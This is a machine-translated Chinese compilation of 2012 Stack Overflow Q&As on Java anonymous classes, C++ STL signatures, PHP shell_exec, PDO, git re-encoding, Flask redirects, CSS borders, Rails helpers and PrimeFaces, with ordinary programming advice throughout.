Theme Check 是一个很棒的插件。当我升级到 3.3 升级版和现在的 3.4 版时，为我节省了大量寻找折旧物品的时间。这是 [WordPress主题检查插件的链接](http://wordpress.org/extend/plugins/theme-check/)

# java - Android 和 Java：runnable 的使用

> ID：11052158
> 
> 赞同：9
> 
> 时间：2012-06-15T14:03:11.860
> 
> 标签：java, android, multithreading, instance, anonymous-class

我已经读过Java接口不能被实例化（[在文档中，*接口*](http://docs.oracle.com/javase/tutorial/java/IandI/createinterface.html)）。Runnable，顾名思义是一个应该由某个类实现的接口。但是在我的一个 Android 应用程序的以下代码中，我看到一个空的构造函数 - Runnable()...（我不确定它是否是一个构造函数），并且已经创建了一个实例 - getStatus。

```
final Runnable getStatus = new Runnable()
{
    public void run()
    {
        TextView uat = (TextView) findViewById(R.id.useAndThrow);
        uat.setText(MyThread.getStatus());
        return;
    }
}; 
```

我所知道的：

1.  这可能是匿名类的一个例子。
2.  该实例实际上不是接口。

但我无法连接这些点。假设上面的代码在 myActivity 类中，实例化了什么，这个匿名类又是怎样的呢？

有点细节会很棒。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-15T14:17:17.960

它被称为“匿名类”。关于它的一些注释：

1.  您没有为它提供名称，因此为您创建了一个。要查看它的真实名称，只需将其写入控制台或读取字节码即可。

2.  匿名类，如果在外部类的范围内创建，它具有对其字段的引用，就像任何内部类一样。通常，它具有与创建位置相同的范围。

3.  如果您只需要一个简单的实现，这是一件很常见的事情。代码越多，您越应该考虑将其放在另一个文件中（为了订单，而不是因为您不能）。

4.  Runnable 不是唯一常见的接口。在 Android 上，您使用 OnClickListener、OnTouchListener、...

5.  由于匿名类与声明它的位置具有相同的范围，这意味着它具有引用。尽量不要将匿名类保留太久（例如，在静态引用中），因为这可能导致内存泄漏。在 Android 上，这一点非常重要，正如这个[示例](http://developer.android.com/resources/articles/avoiding-memory-leaks.html)所示（谈论可绘制对象，但匿名类也可以引用上下文）。

6.  匿名类的一些缺点是它们没有构造函数，并且它不能实现多个接口。它的使用范围很窄，但很受欢迎，因为它非常易于使用（和阅读）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-15T14:11:42.250

谷歌使用“匿名内部类”获取更多信息。这篇[“Java 中的内部类，其中的奥秘”博](http://viralpatel.net/blogs/inner-classes-in-java/)文很好地解释了不同类型的内部类。另见[“3.12\. 匿名类”](http://docstore.mik.ua/orelly/java-ent/jnut/ch03_12.htm)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:04:54.577

正在实例化的是`Runnable`. 它之所以称为匿名，是因为该类型本身没有名称。在这个子类中，您正在实现接口`run()`中指定的方法。`Runnable`

的类型`getStatus`是`Runnable`，但是被引用的对象`getStatus`实际上是一个`Runnable`没有显式命名类型的实现。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-15T14:19:26.080

该代码正在创建一个实现 Runnable 接口的类的实例。该类没有名称。

# c++ - 请帮我解读 STL 自动完成建议

> ID：11052159
> 
> 赞同：1
> 
> 时间：2012-06-15T14:03:12.273
> 
> 标签：c++, templates, stl

我在 VS 上使用带有 STL 的 MSVC。它给出的自动完成建议让我很伤心。你能打破这个`std::transform`功能的建议吗？

```
_OutTy * transform<_InIt1, _InTy, _InSize, _OutTy, _OutSize, _Fn2>
(_InIt1 _First1, _InIt1 _Last1, _InTy (&_First2)[_InSize], _OutTy(&_Dest)[_OutSize], _Fn2 _Func) 
```

**编辑**：我很抱歉，但我应该更清楚。我看到了转换的文档。我希望有人分解上面句子中的各种符号。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:56:08.643

建议的重载是针对第三个和第四个参数都是数组的情况的特化。`_InTy (&_First2)[_InSize]`更具可读性`InType (&Second)[InputLength]`，即`Second`是对类型数组的引用`InType[InputLength]`。

这种特化的优点是编译器知道第二个输入序列的长度。主重载只有一个模板`InputIterator BeginOfSecond`参数，但没有`EndOfSecond`参数。

同样，`_OutTy(&_Dest)[_OutSize]`如果这是一个数组，则允许编译器检测输出序列的长度。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-19T01:49:51.583

```
_OutTy* // output type   
transform<_InIt1, // input iterator type for first range
          _InTy, _InSize, // input and size type for second range (array)
          _OutTy, _OutSize, // output and size type for output range (array)
          _Fn2> // transformation function object type
(_InIt1 _First1, _InIt1 _Last1, // first and last iterators for first range
 _InTy (&_First2)[_InSize], // array for second range
 _OutTy(&_Dest)[_OutSize], // array for output range
 _Fn2 _Func) // transformation function object 
```

我的建议：不要浪费时间这样做。我花了几分钟才自己打破它，我已经习惯了这些东西。按照其他帖子中的建议快速访问文档。

如果您希望能够破译 MSVC 的 C++ 库实现，它有助于查看它们的标头，而不仅仅是智能感知。您将了解他们使用的一些常见约定，例如`InIt`输入迭代器、`RanIt`随机访问迭代器等。理解基本的 STL 概念（如序列、输入迭代器、双向迭代器等）也很重要。这里有一个相当过时但仍然很好且措辞谨慎的参考：[http ://www.sgi.com/tech/stl/table_of_contents.html](http://www.sgi.com/tech/stl/table_of_contents.html)

关于这个重载需要注意的是，第二个范围和输出范围是自动推导出大小的数组，而第一个范围通常指定为一对指向范围开始和结束的迭代器。否则，前三个参数将是输入迭代器，第四个和返回类型将是输出迭代器。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:20:32.247

**更新了从 cplusplus.com 到 cppreference.com 的参考**

来自[cppreference.com](http://en.cppreference.com/w/cpp/algorithm/transform)

```
template< class InputIterator1, class InputIterator2, class OutputIterator, class BinaryOperation >
OutputIterator transform( InputIterator1 first1, 
                          InputIterator1 last1,
                          InputIterator2 first2, 
                          OutputIterator d_first, 
                          BinaryOperation binary_op ); 
```

## 参数

*   **first1, last1** - 要转换的第一个元素范围
*   **first2** - 要转换的第二个元素范围的开始
*   **d_first** - 目标范围的开始，可能等于 first1 或 first2
*   **binary_op** - 将应用的二进制操作函数对象。函数的签名应该等价于： `Ret fun(const Type1 &a, const Type2 &b);` 签名不需要有 const &。Type1 和 Type2 类型必须使得 InputIterator1 和 InputIterator2 类型的对象可以被取消引用，然后分别隐式转换为 Type1 和 Type2。Ret 类型必须使得 OutputIterator 类型的对象可以被取消引用并分配一个 Ret 类型的值。​</li>

## 返回值

*   将迭代器输出到经过最后一个转换的元素之后的元素。

希望有帮助

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-15T14:21:23.977

事实上，C++ Intellisense 有时会很痛苦。因此，我建议按 F1 或在 MSDN 上搜索 std::transform：http: [//msdn.microsoft.com/en-us/library/391xya49%28v=VS.71%29.aspx](http://msdn.microsoft.com/en-us/library/391xya49%28v=VS.71%29.aspx)给出以下解释：

```
_First1
    An input iterator addressing the position of the first element in the first source range to be operated on.
_Last1
    An input iterator addressing the position one past the final element in the first source range operated on.
_First2
    An input iterator addressing the position of the first element in the second source range to be operated on.
_Result
    An output iterator addressing the position of the first element in the destination range.
_Func
    User-defined unary function object used in the first version of the algorithm that is applied to each element in the first source range or A user-defined (UD) binary function object used in the second version of the algorithm that is applied pairwise, in a forward order, to the two source ranges. 
```

# php - 从 PHP 运行 Bash 命令

> ID：11052162
> 
> 赞同：65
> 
> 时间：2012-06-15T14:03:18.820
> 
> 标签：php, bash, exec

我有一个 bash 脚本，我通过命令行像这样运行：

```
./script.sh var1 var2 
```

在调用某个 php 文件后，我正在尝试执行上述命令。

我现在拥有的是：

```
$output = shell_exec("./script.sh var1 var2");
echo "<pre>$output</pre>"; 
```

但它不起作用。我也尝试过使用`exec`and `system`，但脚本从未执行过。

但是，当我尝试运行`shell_exec("ls");`它时它确实有效并且`$output`是所有文件的列表。

我不确定这是因为我使用的 VPS 的限制，还是问题出在其他地方？

* * *

## 回答 #1

> 赞同：93
> 
> 时间：2012-06-15T14:18:03.047

在调用脚本之前，您可能需要[chdir](http://us3.php.net/manual/en/function.chdir.php)到正确的目录。这样，您可以在调用 shell 命令之前确保您的脚本“在”哪个目录。

```
$old_path = getcwd();
chdir('/my/path/');
$output = shell_exec('./script.sh var1 var2');
chdir($old_path); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-15T14:18:00.937

您的 shell_exec 由 www-data 用户从其目录执行。你可以试试

```
putenv("PATH=/home/user/bin/:" .$_ENV["PATH"].""); 
```

你的脚本在哪里*/home/user/bin* 稍后你可以

```
$output = "<pre>".shell_exec("scriptname v1 v2")."</pre>";
echo $output; 
```

显示命令的输出。（或者，在不导出路径的情况下，尝试提供脚本的整个路径，而不仅仅是 ./script.sh

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-09-22T09:41:23.760

检查是否没有在您使用的域的 php.ini 或 .htaccess 中设置 open_basedir。这会将您囚禁在您的域目录中，并且 php 将只能访问在该目录中执行。

# php - PDO 连接失败，如何连接

> ID：11052170
> 
> 赞同：-3
> 
> 时间：2012-06-15T14:03:38.107
> 
> 标签：php, pdo

您能否指出我在以下陈述中做错了什么？

```
$db = new PDO('mysql:dbname=my-db-name','host=localhost', 'username', 'password', array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8' COLLATE 'utf8_unicode_ci';"));
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); 
```

有语法错误。我知道这将是一个愚蠢的问题，但我有点卡在这里。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:06:18.930

你在给你 db:name 和本地主机的地方做错了，它应该如下所示

`'mysql:dbname=my-db-name;host=localhost'` 检查我是否添加`;`了它，编辑它并尝试它

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:06:53.673

```
new PDO('mysql:host=localhost;dbname=my-db-name', 'username', 'password' [...] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:07:46.433

如果我没记错的话，应该是这样的

```
 $db     = new PDO('mysql:host=localhost;dbname=my-db-name', 'username', 'password', array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8' COLLATE 'utf8_unicode_ci';"));
 $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); 
```

# windows-mobile - 来电停止应用程序 - Windows Mobile

> ID：11052177
> 
> 赞同：0
> 
> 时间：2012-06-15T14:04:05.197
> 
> 标签：windows-mobile

不久前开发了一个基于Windows Mobile Professional 6.0 (C#) 的紧凑框架的系统，但是当这个系统运行并且PDA接收到某种类型的调用时，我的应用程序突然终止导致数据丢失并迫使用户重新打开.

有谁知道会发生什么？或者有没有办法让这两个功能在不相互干扰的情况下保持使用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T09:05:13.053

大多数时候，根据无线电、手机信号塔和提供商的不同，一部手机只能处理一个连接，无论是语音连接还是数据连接。

语音通话的优先级高于数据连接，因此在通话过程中数据连接会中断。

您需要使您的应用程序兼容非持续数据连接或禁用来电接收。

可能的进一步帮助： http: [//www.codeproject.com/Articles/32200/Own-your-phone-Taking-back-control-of-your-mobile](http://www.codeproject.com/Articles/32200/Own-your-phone-Taking-back-control-of-your-mobile)

或者您只需杀死 cprog.exe 或将其替换为自定义应用程序

问候

约瑟夫

# sharepoint-2010 - SharePoint 2010 安装 - 工件

> ID：11052184
> 
> 赞同：0
> 
> 时间：2012-06-15T14:04:46.620
> 
> 标签：sharepoint-2010

安装 SharePoint 2010 时，哪些项目被复制到数据库，哪些项目被复制到文件系统？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-20T07:53:01.373

基本上所有关键的东西都存储在数据库中，除非您的自定义代码将某些东西放在文件系统中。

**数据库：**

*   SharePoint 场配置（包括您可以在中央管理中看到的所有设置）
*   服务应用数据库
*   网站集数据库 (contentdb)

**文件系统：**

*   SharePoint Server（程序集、语言资源、默认样式表、_layouts aspx..etc）
*   定制解决方案（WSP - 自行开发/部署）
*   日志
*   Powershell 脚本

# javascript - 在 d3.js 选择/追加期间访问 dom 元素 - 创建自定义标签云

> ID：11052185
> 
> 赞同：0
> 
> 时间：2012-06-15T14:04:46.737
> 
> 标签：javascript, svg, tags, d3.js

我正在尝试使用 d3.js 创建一个词/标签云，其中 y 轴由数据变量控制，而不是像普通词/标签云中的随机放置。所以我不介意文本在 x 轴上的位置，但我确实想要控制它在 y 轴上的位置。

我的方法是使用 x 属性函数为每条数据添加一个文本元素：

```
.attr("x", function(d,i) {
    loop 10 times
        generate random x
        loop through previous added element <i to check for collision
        no collision exit loop
    if (collision) set x to somewhere off the image 
```

此方法失败，因为在追加完成之前我似乎无法访问任何先前的元素。

对执行此操作的更好方法或在附加期间访问元素的方法有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-13T12:43:20.943

在这里，您有 Jason Davies 的一个很好的词云实现，其中几乎包含您想要进行的任何自定义：[http://www.jasondavies.com/wordcloud/#http%3A%2F%2Fsearch.twitter.com%2Fsearch。 json%3Frpp%3D100%26q%3D%7Bword%7D=云](http://www.jasondavies.com/wordcloud/#http%3A%2F%2Fsearch.twitter.com%2Fsearch.json%3Frpp%3D100%26q%3D%7Bword%7D=cloud)

# git - 转换 git 存储库文件编码

> ID：11052199
> 
> 赞同：29
> 
> 时间：2012-06-15T14:05:31.677
> 
> 标签：git, utf-8, character-encoding, cvs, cvs2svn

我有一个包含文件的大型 CVS 存储库，`ISO-8859-1`并希望将其转换为 git。

当然我可以将 git 配置为`ISO-8859-1`用于编码，但我想将它放在`utf8`.

现在使用`iconv`or之类的工具，`recode`我可以转换工作树中文件的编码。我可以用这样的消息来提交这个`converted encoding`。

我现在的问题是，是否有可能转换完整的历史记录？从 cvs 转换为 git 时或之后。我的想法是编写一个脚本来读取 git 存储库中的每个提交，并将其转换为`utf8`并提交到新的 git 存储库中。

这可能吗（我不确定哈希码以及如何遍历提交、分支和标签）。或者有没有工具可以处理这样的事情？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-06-15T15:32:31.730

您可以使用`git filter-branch`. 这个想法是您必须在每次提交中更改文件的编码，并随时重写每个提交。

首先，编写一个脚本来更改存储库中每个文件的编码。它可能看起来像这样：

```
#!/bin/sh

find . -type f -print | while read f; do
        mv -i "$f" "$f.recode.$$"
        iconv -f iso-8859-1 -t utf-8 < "$f.recode.$$" > "$f"
        rm -f "$f.recode.$$"
done 
```

然后使用`git filter-branch`一遍又一遍地运行这个脚本，每次提交一次：

```
git filter-branch --tree-filter /tmp/recode-all-files HEAD 
```

`/tmp/recode-all-files`上面的脚本在哪里。

刚从 CVS 升级存储库后，您可能在 git 中只有一个分支，其线性历史可以追溯到开头。如果您有多个分支，则可能需要增强`git filter-branch`命令以编辑所有提交。

# php - 将旧的 php url 重定向到新的烧瓶 url

> ID：11052200
> 
> 赞同：2
> 
> 时间：2012-06-15T14:05:32.047
> 
> 标签：php, python, redirect, flask

我有一个用 php 编写的网站，其中包含诸如`example.com/index.php?q=xyz`. 现在我已经在烧瓶（python）中重写了它，它有`example.com/search?q=xyz`. 最好的方法是什么？

我想到的一种方法是编写一个 index.php 和 php 中的代码来重定向。但是是否有可能仅使用应用程序（烧瓶）来实现相同的目标？

更新：发送参数不完全相同，也有一些自定义。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:11:37.900

如果使用 apache，将重写规则放入 httpd.conf 文件的目录部分或放入 .htaccess 文件可能是最简单的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-17T19:21:25.417

是的，它可以在 Flask 中完成。

我将首先向您展示代码，然后再进行解释。

## 代码

```
 @app.route('/index.php')
    def index():
        url = url_for('search',q=request.args['q'])
        return redirect(url)

    @app.route('/search')
    def search():
        # Access q as request.args['q'] same as we have done above 
```

## 解释

每当 Flask 接收到一些附加到有效 url 的参数时，在这种情况下 q 附加到 'index.php' url，带有？作为连接元素。它将这些参数保存在名为 args的 MultiDict（在[此处阅读）中，该参数可用作 Flask 的全局请求变量的属性。](http://werkzeug.pocoo.org/docs/datastructures/#werkzeug.datastructures.MultiDict)

你访问它作为

```
 request.args['parameter_name'] 
```

请记住，参数值已转换为字符串，并且任何整数值都应通过 int() 传递。

此代码仅捕获 index.php url 和它的参数，然后重定向到您的新搜索 url，并按原样传递参数。您还可以处理参数并传递给搜索 url。这样，两个网址最终都会完成您想要的工作。

希望有帮助！:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T18:29:25.673

Flask 不关心规则中的名称是什么，因为它们不指向文件。你可以写：

```
@app.route('/index.php')
def index_view():
    pass 
```

# css - 我可以通过直接连接在 CSS 中使用不同颜色的左边框和上边框吗？

> ID：11052202
> 
> 赞同：30
> 
> 时间：2012-06-15T14:05:33.907
> 
> 标签：css, border

我想在左边有一个 4px 厚的粉红色和 1px 灰色的边框：

```
border: 1px solid #E5E5E5;
border-left: 4px solid #F24495; 
```

问题是连接是对角的，所以我得到了一个可怕的覆盖。我试过：

```
.item:before{ 
  border-left: 4px solid #F24495;
} 
```

但没有运气。

## jsFiddle 示例

*   [突出显示对角连接的 jsFiddle 示例](http://jsfiddle.net/ex6ZR/)

## 截屏

![截屏](../Images/b94dbbb974189bae9ebada4de376b9f6.png)

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-06-15T14:15:42.820

`.item::before`是正确的方法，但它需要在单个`border-left`属性之外进行一些工作。您需要使伪元素可见 ( `display: block; content: "";`)，将伪元素放置在 的左侧`.item`，然后将其拉伸以与顶部和底部边框正确对齐。

虽然这可以手动完成，但我强烈建议使用[CSS 变量](https://developer.mozilla.org/en-US/docs/Web/CSS/--*)（或[预处理器](https://sass-lang.com/guide#topic-2)中的[变量](http://lesscss.org/features/#variables-feature)），因为它可以减少更新边框宽度的错误和痛苦。

```
.item {
  display: inline-block;
  padding: 0.2em 0.3em;
  background: #f8f8f8;
  color: #454545;

  /* Set border widths with variables */
  --top-border-width: 4px;
  --bottom-border-width: var(--top-border-width);
  --left-border-width: 16px;
  --right-border-width: var(--top-border-width);

  /* Set border styles for each side */
  border-top: var(--top-border-width) solid #e4e4e4;
  border-bottom: var(--bottom-border-width) solid #e4e4e4;
  border-right: var(--right-border-width) solid #e4e4e4;

  /* Remove the left border and add blank space where the border should be placed */
  border-left: 0;
  margin-left: var(--left-border-width);

  /* Contain the ::before */
  position: relative;
}

.item::before {
  /* Give the pseudo element substance */
  display: block;
  content: "";

  /* Add a left border with a straight edge */
  border-left: var(--left-border-width) solid #f84995;

  /* Position pseudo element's border where the normal border would have been placed */
  position: absolute;
  top: calc(0px - var(--top-border-width));
  bottom: calc(0px - var(--bottom-border-width));
  left: calc(0px - var(--left-border-width));
}
```

```
<h1 class="item">Gen.2</h1>
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-15T14:07:26.777

这应该可以，但需要额外的标记：

```
.outer {
    border: 1px solid #E5E5E5;
    border-left: 0;
}

.inner {
    border-left: 4px solid #F24495;
} 
```

和

```
<div class="outer">
    <div class="inner">
        ...
    </div>
</div> 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-06-15T14:14:35.560

如果您希望使用`:before`伪选择器，您还需要设置一些内容。例如，请参阅带有以下示例代码的[这个 jsfiddle ：](http://jsfiddle.net/NeaSh/1/)

```
<div>Container</div> 
```

CSS：

```
div {
    border: 10px solid black;
    border-left-width: 0;
}
div::before {
    border: 10px solid orange;
    border-right-width: 0;
    content: '';
} 
```

显示为：

![工作代码的屏幕截图](../Images/0d04d5e34b0aafde2a46688009a7a6df.png)

**编辑**
嗯，虽然这应该严格回答问题，但在尝试将我的解决方案调整为问题的小提琴时，我发现这与填充效果不太好。打开可以处理该位的建议/编辑/其他答案:(...

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-01-27T16:10:42.643

### 背景

默认情况下，CSS 对所有边框关节使用[斜接关节](https://en.wikipedia.org/wiki/Miter_joint)（45° 角）。因此，要为任何边框实现方形关节（90° 角），您可以使用 (1) 内部[box-shadow](https://developer.mozilla.org/en-US/docs/Web/CSS/box-shadow)，(2)[伪元素](https://developer.mozilla.org/en-US/docs/Web/CSS/Pseudo-elements)或 (3) [background-image](https://developer.mozilla.org/en-US/docs/Web/CSS/background-image)和多个[linear-gradients](https://developer.mozilla.org/en-US/docs/Web/CSS/linear-gradient)。

假设您有以下要设置样式的元素：

```
<div></div> 
```

### 选项1：使用方形接头`box-shadow`

```
div {
  /* downside of using box-shadow, you need to add the   */
  /* inner border size to the padding on top of any      */
  /* additional padding you might want                   */
  padding: 20px;
  /* by changing the order of your box-shadows, you      */
  /* can modify which borders overlap each other         */
  box-shadow:
    /* left "inner border" */
    inset 20px 0 0 0 red,
    /* right "inner border" */
    inset -20px 0 0 0 grey,
    /* top "inner border" */
    inset 0 20px 0 0 grey,
    /* bottom "inner border" */
    inset 0 -20px 0 0 grey;
} 
```

> *   [在 JSFiddle 上查看](http://jsfiddle.net/8Lgu6zp2/)
> *   [浏览器支持`box-shadow`](https://caniuse.com/#search=box-shadow)

### 选项2：方形接头`pseudo-elements`

```
div {
  border: 20px solid grey;
}

div::before {
  position: absolute;
  background-color: red;
  content: "";
  width: 20px;
  /* we need to add the height of the top and bottom    */
  /* border to the pseudo-elements' height as the       */
  /* inset border is not included in the height of the  */
  /* div even when "box-sizing: border-box" is set.     */
  height: calc(100% + 20px + 20px);
  top: -20px;
  left: -20px;
} 
```

> *   [在 JSFiddle 上查看](http://jsfiddle.net/wfzxuqoj/)
> *   [浏览器支持`pseudo-elements`](https://caniuse.com/#search=pseudo-elements)

### 选项 3：方形接头使用`background-image`和多个`linear-gradients`

```
div {
  /* downside of using multiple linear-gradients, you   */
  /* need to add the inner border size to the padding   */
  /* on top of any additional padding you might want    */
  padding: calc(20px + 10px);
  background-image: 
    /* left "inner border" */
    linear-gradient(to right, red 20px, transparent 20px),
    /* right "inner border" */
    linear-gradient(to left, grey 20px, transparent 20px),
    /* top "inner border" */
    linear-gradient(grey 20px, transparent 20px),
    /* bottom "inner border" */
    linear-gradient(to top, grey 20px, transparent 20px);
} 
```

> *   [在 JSFiddle 上查看](http://jsfiddle.net/vqfx0sk9/)
> *   [浏览器支持`background-images()`](https://caniuse.com/#search=background-image)
> *   [浏览器支持`linear-gradient()`](https://caniuse.com/#search=linear-gradient)

# ruby-on-rails - Rails 辅助功能似乎不起作用

> ID：11052203
> 
> 赞同：1
> 
> 时间：2012-06-15T14:05:36.840
> 
> 标签：ruby-on-rails

免责声明：我是 Rails n00b。我正在玩一个简单的辅助函数，它没有做我想做的事情。

*   我有一个名为“webform”的模型，带有一些文本字段（名称、地址等）
*   我正在尝试使用辅助函数来测试 if 语句（即'is the :address =='10'）
*   这是辅助功能

    ```
    def webforms_helper
      if :address == 10
        print "Address is 10"
      else
        print "Address is not 10"
      end   
    end 
    ```

*   在我的“显示”视图中，我已经合并了辅助函数`<%= webforms_helper %>`

*   我加载了网络应用程序，没有出现任何错误——但是，它没有打印出“地址为 10”或“地址不是 10”
*   我也没有成功使用 puts （并检查控制台）而不是 print

*   有什么想法吗？我为新手问题道歉；）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:31:25.047

首先，一个合适的助手应该是这样的：

```
module ApplicationHelper
  def myformchecker(ahash)
     if ahash[:address] == '10'
        return 'Address is 10'
     end
  end
end 
```

然后在你的控制器中：

```
class ApplicationController < ActionController::Base
  helper: application
  ...
end 
```

那么在你看来：

```
<%= myformchecker(params) %> 
```

因此，如果视图是响应表单提交而呈现的，并且表单具有以下内容：

```
<%= text_field_tag :address %> 
```

当用户填写表格并将字符串“10”作为地址时，您的视图中将生成“地址为 10”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:21:01.513

嗯，你的练习不是很清楚，但是像这样......

```
def webforms_helper 
  if :address == 10 
    print "Address is 10" 
  else 
    print "Address is not 10" 
  end
end 
```

出于 1 个原因，永远不会将任何内容打印到 Rails 视图，您正在使用 puts 和 print 方法，这两个将输出到控制台。您必须返回字符串本身，这样做...

```
def webforms_helper 
  if :address == 10 
    "Address is 10" 
  else 
    "Address is not 10" 
  end
end 
```

我知道您正在做一个简单的演示，但是将参数传递给 Helper 是个好主意。这就是你 99% 的时间会做的事情。

```
def webforms_helper(address)
  if address == 10 
    #return something meaningful as string to the view
  else 
    #return something meaningful as string to the view too.
  end
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T14:17:04.420

您应该将信息传递给帮助者，以便帮助者为您做出决定。

```
# app/views/webforms/show.html.erb
<%= webforms_helper(address) %>

# app/helpers/webform_helper.rb
module WebformHelper
  def webforms_helper(address)
    if address == 10
      "Address is 10"
    else
      "Address is not 10"
    end
  end
end 
```

如果您刚开始使用 Rails，我也衷心建议您找一本好书（[Agile Web Development with Rails](http://pragprog.com/book/rails4/agile-web-development-with-rails)）或教程（[Ruby on Rails 教程）。](http://pragprog.com/book/rails4/agile-web-development-with-rails)

# ruby-on-rails-3 - 显示关联记录的一个棘手错误

> ID：11052207
> 
> 赞同：0
> 
> 时间：2012-06-15T14:05:45.490
> 
> 标签：ruby-on-rails-3, debugging, activerecord

我遇到了一个错误，但无法找到并解决。这是我到目前为止所拥有的： [https](https://gist.github.com/2936556) ://gist.github.com/2936556这显示了模型关系和控制器动作。 [https://gist.github.com/2936562](https://gist.github.com/2936562)这显示了触发错误的操作的视图模板部分

错误是即使论坛确实有主题，也会以某种方式显示“forum.lines.notopics”消息。我已经使用调试器 gem 来跟踪事情，但错误似乎有点随机（使用调试器时，它在大多数情况下出现，没有它 - 总是）。

日志显示没有查询来加载主题。使用@forum.topics 代替@topics 根本没有任何区别。

有人有任何线索吗？

PS如果需要更多信息，请问。导轨 3.2.1，红宝石 1.9.3。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T16:05:05.523

`@topics`唯一的想法是，当您检查Rails 时，它可能还没有真正加载`<% if @topics.any? %>`。尝试急切加载主题

```
@forum = Forum::Forum.includes(:topics).find_by_id(params[:id]) 
```

（无论如何你可能需要这样做，你真的需要 N+1 个查询吗？:)

如果它没有帮助，请尝试检查主题计数而不是`@topics.any?`

```
<% if @forum.topics.count > 0 %> 
```

# primefaces - p:按钮切换就地输入

> ID：11052214
> 
> 赞同：3
> 
> 时间：2012-06-15T14:05:57.100
> 
> 标签：primefaces

我正在尝试获得一个可以切换 p:inplace 项目的按钮。我正在尝试使用切换功能，但没有任何运气。

```
<p:inplace widgetVar="X" >
  <p:inputText  value="test"></p:inputText>
 </p:inplace>

<p:button value="toggle" onclick="X.toggle()" /> 
```

当我这样做时，我在浏览器的控制台中收到以下消息

未捕获的类型错误：无法调用未定义的 primefaces.js.jsf:18 PrimeFaces.widget.Inplace.PrimeFaces.widget.BaseWidget.extend.toggle primefaces.js.jsf:18 onclick 的方法“fadeOut”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-11T15:35:42.277

看起来默认效果有一个错误。将效果更改为其他标准效果之一，看看是否能让您继续前进。

```
<p:inplace widgetVar="X" effect="clip">
  <p:inputText  value="test"></p:inputText>
</p:inplace> 
```

用户手册中定义的可用效果：

```
• blind
• clip
• drop
• explode
• fold
• puff
• slide
• scale
• bounce
• highlight
• pulsate
• shake
• size
• transfer 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-26T12:10:08.727

切换 javascript 函数看起来很奇怪。它仅支持 3 个效果值。它还需要两个第一个参数 - 要显示的元素和要隐藏的元素。不知道如何使用它。

```
PrimeFaces.widget.Inplace.prototype.toggle = function(elToShow, elToHide, callback) {
    var _self = this;
    if(this.cfg.effect == 'fade') {
        elToHide.fadeOut(this.cfg.effectSpeed,
                function(){
            elToShow.fadeIn(_self.cfg.effectSpeed);

            if(callback)
                callback.call(_self);
        });
    }
    else if(this.cfg.effect == 'slide') {
        elToHide.slideUp(this.cfg.effectSpeed,
                function(){
            elToShow.slideDown(_self.cfg.effectSpeed);
        });
    }
    else if(this.cfg.effect == 'none') {
        elToHide.hide();
        elToShow.show();
    }
} 
```

我可以推荐至少一种解决方法（相当骇人听闻，因为它使用标签生成的标记的内部 id，但对我有用（PrimeFaces 3.5）：

```
<p:inplace event="none" id="xId">
    <h:inputText value="test"/>
</p:inplace>
<p:commandButton value="Toggle" 
    oncomplete="$('#xId_content,#xId_display').toggle()" /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-05T18:12:31.203

PrimeFaces 的最新版本（从 4 和更高版本 iirc）可以选择添加`type="button"`到，`p:commandButton`然后它不会在服务器上调用任何东西，只是客户端 javascript

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-09-05T16:58:29.953

尝试使用它，对我有用：

```
 <p:commandLink onclick="PF('X').toggle()" title="Toggle"></p:commandLink> 
```

它会为你切换你的widgetvar。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2017-06-02T12:16:47.320

非常简单：而不是`toggle()`你必须使用`show()`, resp。`hide()`功能，在你的情况下：

```
<p:button value="toggle" onclick="X.show()" /> 
```

# c++ - 为什么我需要在 C++ 的所有文件中包含预编译的头文件？

> ID：11052217
> 
> 赞同：1
> 
> 时间：2012-06-15T14:05:59.527
> 
> 标签：c++, visual-studio, precompiled-headers

如果即使在空的 .cpp 中也不包含 stdafx，我会收到此错误

```
fatal error C1010: unexpected end of file while looking for precompiled header. Did you forget to add '#include "StdAfx.h"' to your source? 
```

为什么即使在虚拟文件中也需要包含它？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T14:11:38.523

您可以禁用每个翻译单元的预编译标头（在给定 CPP 文件的属性中）。如果您愿意探索配置 GUI，您也可以按项目执行此操作。并非所有项目类型都指定 PCH；它只是标准的微软方式。

我从来没有在微软领域之外遇到过它们，所以“在 C++ 中”有点过于笼统了！

